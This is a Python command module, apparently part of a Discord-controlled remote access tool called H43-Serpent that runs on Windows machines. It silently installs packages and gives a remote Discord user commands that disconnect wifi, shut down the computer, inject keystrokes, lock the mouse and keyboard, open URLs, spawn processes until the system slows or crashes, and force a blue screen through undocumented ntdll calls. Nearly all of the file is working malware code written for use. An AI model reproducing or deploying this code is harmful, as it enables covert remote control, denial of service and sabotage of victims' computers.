'''                                                
 _____ ___ ___     _____                     _   
|  |  | | |_  |___|   __|___ ___ ___ ___ ___| |_ 
|     |_  |_  |___|__   | -_|  _| . | -_|   |  _|
|__|__| |_|___|   |_____|___|_| |  _|___|_|_|_|  
                                |_|              


Author: Fytex
REPO: https://github.com/Fytex/H43-Serpent
'''


import sys
import subprocess

packages = ['pynput', 'pycaw', 'pillow', 'PyDirectInput']
while subprocess.call(
    [sys.executable, '-m', 'pip', 'install', '--upgrade', *packages],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL
): pass


import os
import io
import time
import math
import pynput
import ctypes
import asyncio
import discord
import tempfile
import winsound
import win32api  # Downloaded previously (in bot.pyw)
import win32con  # Downloaded previously (in bot.pyw)
import pythoncom # Downloaded previously (in bot.pyw)
import threading
import webbrowser
import pydirectinput


from PIL import Image
from ctypes import windll
from ctypes import byref
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from comtypes import CLSCTX_ALL
from discord.ext import commands
from ctypes import cast, POINTER
from subprocess import Popen, PIPE
from pynput.keyboard import Key, Controller
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume


subprocess.call(
    [sys.executable, '-m', 'pip', 'install', '--upgrade', 'pyWinhook'],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL
)
try:
    import pyWinhook as pyHook
except ModuleNotFoundError:
    HAS_PYHOOK = False
else:
    HAS_PYHOOK = True



class Lib(commands.Cog):

    def __init__(self, bot):
        self.bot = bot
        self.tmp_sound = None
        self.blocker_thread = None
        self.mouse_listener = None
        self.keyboard_listener = None

        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        self.volume = cast(interface, POINTER(IAudioEndpointVolume))


    @commands.command(
        name='hello',
        brief='Check if Bot is online',
        description='Nothing interesting... Just to check if bot\'s library is correctly loaded'
    )
    async def hello(self, ctx):
        """Says hello"""
        await ctx.send(f'Welcome summoner,  {ctx.author.name}~ Hehehe :)')


    @commands.command(
        name='off_wifi',
        brief='Disable wifi',
        description='Disables wifi for x seconds (passed as parameter). It\'s not a garantee that it will reconnect automatically after.'
    )
    async def off_wifi(self, ctx,
        time_sec:int = commands.parameter(default=1, description='Time in seconds')
    ):
        for i in range(time_sec):
            os.system('netsh wlan disconnect')
            await time.sleep(1)


    @commands.command(
        name='shutdown',
        brief='Shutdown computer',
        description='Shutdown computer. If time (seconds) is passed than it will pop up a warning message and do a countdown otherwise it will instantaneously shutdown. To cancel count-down pass time as -1.'
    )
    async def shutdown(self, ctx,
        time_sec:int = commands.parameter(default=0, description='Time in seconds')
    ):
        if time_sec == -1:
            os.system(f'shutdown /a')
        else:
            os.system(f'shutdown /s /t {time_sec}')



    def _parse_cmds(self, arg, actions):
        type_text = actions['type_text']
        press_key = actions['press_key']
        release_key = actions['release_key']
        tap_key = actions['tap_key']

        special_keys = actions['special_keys']

        cmd_buffer = []
        text_buffer = ''

        while arg:
            is_special_key = False
                
            for special_key in special_keys.keys():
                if arg.lower().startswith('<' + special_key + '>'):            
                    if text_buffer:
                        cmd_buffer.append(type_text(text_buffer))
                        text_buffer = ''

                    cmd_buffer.append(press_key(special_keys[special_key]))
                    arg = arg[len('<' + special_key + '>'):]
                    is_special_key = True
                    break

                elif arg.lower().startswith('</' + special_key + '>'):
                    if text_buffer:
                        cmd_buffer.append(type_text(text_buffer))
                        text_buffer = ''

                    cmd_buffer.append(release_key(special_keys[special_key]))
                    arg = arg[len('</' + special_key + '>'):]
                    is_special_key = True
                    break

                elif arg.lower().startswith('{' + special_key + '}'):
                    if text_buffer:
                        cmd_buffer.append(type_text(text_buffer))
                        text_buffer = ''

                    cmd_buffer.append(tap_key(special_keys[special_key]))
                    arg = arg[len('{' + special_key + '}'):]
                    is_special_key = True
                    break

            if not is_special_key:
                text_buffer += arg[0]
                arg = arg[1:]


        if text_buffer:
            cmd_buffer.append(type_text(text_buffer))

        return cmd_buffer

        
        
    

    @commands.command(
        name='type',
        brief='(!) Warning. Type letters (keys and hotkeys) and combine them',
        description='(!) Warning: Low probability of anti-cheat banning in games and it is possible to do something malicious by combining instructions. Type receives the following instructions: \n\t- letters : It writes them.\n\t- {HOTKEY} : It presses\n\t- <HOTKEY>...</HOTKEY> : It holds the hotkey then executes what\'s in "..." and finally releases it.\nIf you need to wait an instant (delay) before the next instruction you can use: |\n\nHOTKEYS:\n' + '\t\t'.join(Key.__members__.keys()) + '\n\nExample:  {ENTER}|<SHIFT>hello</SHIFT>{ENTER}'
    )
    async def type(self, ctx,
        *, cmds_line = commands.parameter(description='Instructions')
    ):
        c = Controller()

        actions = {
            'type_text': lambda t: lambda: c.type(t),
            'press_key': lambda k: lambda: c.press(k),
            'release_key': lambda k: lambda: c.release(k),
            'tap_key': lambda k: lambda: c.tap(k),
            'special_keys': Key.__members__
        }

        args = cmds_line.split('|')

        for arg in args:
            
            cmd_buffer = self._parse_cmds(arg, actions)
            
            for cmd in cmd_buffer:
                cmd()

            await asyncio.sleep(0.3)


    @commands.command()
    async def type2(self, ctx, *, cmds_line):
        actions = {
            'type_text': lambda t: lambda: pydirectinput.write(t),
            'press_key': lambda k: lambda: pydirectinput.keyDown(k),
            'release_key': lambda k: lambda: pydirectinput.keyUp(k),
            'tap_key': lambda k: lambda: pydirectinput.press(k),
            'special_keys': {k:k for k in pydirectinput.KEYBOARD_MAPPING.keys()}
        }

        args = cmds_line.split('|')

        for arg in args:
            
            cmd_buffer = self._parse_cmds(arg, actions)
            
            for cmd in cmd_buffer:
                cmd()

            await asyncio.sleep(0.3)


    @commands.command()
    @commands.check(lambda _: HAS_PYHOOK)
    async def lock_input2(self, ctx):

        def input_blocker():
            # create a hook manager and register the block_input function
            hm = pyHook.HookManager()
            hm.MouseAll = lambda _: False
            hm.KeyAll = lambda _: False
            hm.HookMouse()
            hm.HookKeyboard()
            # start the event loop to capture and discard events
            pythoncom.PumpMessages()
            # unhook the mouse and keyboard hooks
            hm.UnhookMouse()
            hm.UnhookKeyboard()

        if self.blocker_thread:
            win32api.PostThreadMessage(self.blocker_thread.ident, win32con.WM_QUIT, 0, 0);
            self.blocker_thread.join()

        self.blocker_thread = threading.Thread(target=input_blocker)
        self.blocker_thread.start()

    @commands.command()
    @commands.check(lambda _: HAS_PYHOOK)
    async def unlock_input2(self, ctx):
        if self.blocker_thread:
            # stop the event loop to unblock the input
            win32api.PostThreadMessage(self.blocker_thread.ident, win32con.WM_QUIT, 0, 0);
            self.blocker_thread.join()
            self.blocker_thread = None
                        

    @commands.command(
        name='site',
        brief='Opens any website',
        description='Opens the website passed as a parameter'
    )
    async def site(self, ctx,
        url = commands.parameter(description='Webiste\'s URL')
    ):
        webbrowser.open(url, new=1)


    @commands.command(
        name='beep',
        brief='Emits a beep sound',
        description='Emits a beep sound for x seconds and with an y frequency (passed as parameters by respective order if you want to modify). Frequency must be in 37 thru 32767'
    )
    async def beep(self, ctx,
        time_sec:int=commands.parameter(default=1, description='Time in seconds'),
        freq:int=commands.parameter(default=2500, description='Frequency')
    ):
        time_sec *= 1000
        winsound.Beep(freq, time_sec)


    @commands.command(
        name='play_sound',
        brief='Plays a sound',
        description='Plays a sound in a file uploaded along with the command. Only accepts WAV file. If the word \'loop\' is present in the command then it plays indefinitely'
    )
    async def play_sound(self, ctx,
        loop:str=commands.parameter(default='', description='Loop flag')
    ):
        flags = winsound.SND_ASYNC | winsound.SND_ALIAS
        if loop.lower() == 'loop':
            flags |= winsound.SND_LOOP

        # Avoid conflicts: Stop before replacing temporary file
        if self.tmp_sound:
            winsound.PlaySound(None, winsound.SND_ASYNC)
            os.unlink(self.tmp_sound)
            self.tmp_sound = None

        if ctx.message.attachments[0].filename.lower().endswith('.wav'):
            # Create temporary WAV file
            with tempfile.NamedTemporaryFile(delete=False) as tmp:
                await ctx.message.attachments[0].save(tmp.file)
                self.tmp_sound = tmp.name
        
            winsound.PlaySound(self.tmp_sound, flags)


    @commands.command(
        name='stop_sound',
        brief='Stops the sound',
        description='Stops the sound'
    )
    async def stop_sound(self, ctx):
        if self.tmp_sound:
            winsound.PlaySound(None, winsound.SND_ASYNC)
            os.unlink(self.tmp_sound)
            self.tmp_sound = None
    

    @commands.command(
        name='lock_input',
        brief='Locks input (Mouse and Keyboard)',
        description='Won\'t be able to use mouse and keyboard until unlock. Be aware that wifi off after lock input can result in a impossible unlock if computer doesn\'t reconnect automatically to the wifi.'
    )
    async def lock_input(self, ctx):
        # Disable mouse and keyboard events
        if self.mouse_listener:
            self.mouse_listener.stop()
        self.mouse_listener = pynput.mouse.Listener(suppress=True)
        self.mouse_listener.start()

        if self.keyboard_listener:
            self.keyboard_listener.stop()
        self.keyboard_listener = pynput.keyboard.Listener(suppress=True)
        self.keyboard_listener.start()


    @commands.command(
        name='unlock_input',
        brief='Unlocks input (Mouse and Keyboard)',
        description='Unlocks input (Mouse and Keyboard)'
    )
    async def unlock_input(self, ctx):
        # Enable mouse and keyboard events
        if self.mouse_listener:
            self.mouse_listener.stop()
            self.mouse_listener = None

        if self.keyboard_listener:
            self.keyboard_listener.stop()
            self.keyboard_listener = None


    @commands.command(
        name='set_volume',
        brief='Sets computer\'s volume from 0 to 100',
        description='Sets computer\'s volume from 0 to 100'
    )
    async def set_volume(self, ctx,
        value:int=commands.parameter(description='Volume')
    ):
        percentage = min(max(value, 0), 100) / 100
        self.volume.SetMasterVolumeLevelScalar(percentage, None)


    @commands.command(
        name='image',
        brief='Opens an image',
        description='Upload an image along with the command and it will be opened on the other side'
    )
    async def image(self, ctx):
        if ctx.message.attachments:
            data = await ctx.message.attachments[0].read()
            Image.open(io.BytesIO(data)).show()


    @commands.command(
        name='bomb',
        brief='(!) Warning. Makes computer slow for a moment',
        description='(!) Warning: Can crash computer. Makes computer slower by level and time (seconds). Level corresponds to the number of tabs it will open on background (more = slower) and time corresponds to the time which this will execute (higher level will require more time)'
    )
    async def bomb(self, ctx,
        level:int=commands.parameter(default=1, description='Level'),
        time_sec:int=commands.parameter(default=10, description='Time')
    ):
        cmd = 'for /l %a in (0,0,0) do start /MIN'
        
        procs = [Popen(cmd, stdout=PIPE, shell=True) for _ in range(level)]

        time.sleep(time_sec)

        CREATE_NO_WINDOW = 0x08000000
        for proc in procs:
            Popen("TASKKILL /F /PID {pid} /T".format(pid=proc.pid), creationflags=CREATE_NO_WINDOW).wait()


    @commands.command(
        name='crash',
        brief='Crash computer',
        description='Crashes computer with a blue screen of death.'
    )
    async def crash(self, ctx):
        nullptr = POINTER(c_int)()

        windll.ntdll.RtlAdjustPrivilege(
            c_uint(19), 
            c_uint(1), 
            c_uint(0), 
            byref(c_int())
        )

        windll.ntdll.NtRaiseHardError(
            c_ulong(0xC000007B), 
            c_ulong(0), 
            nullptr, 
            nullptr, 
            c_uint(6), 
            byref(c_uint())
        )



async def setup(bot):
    await bot.add_cog(Lib(bot))
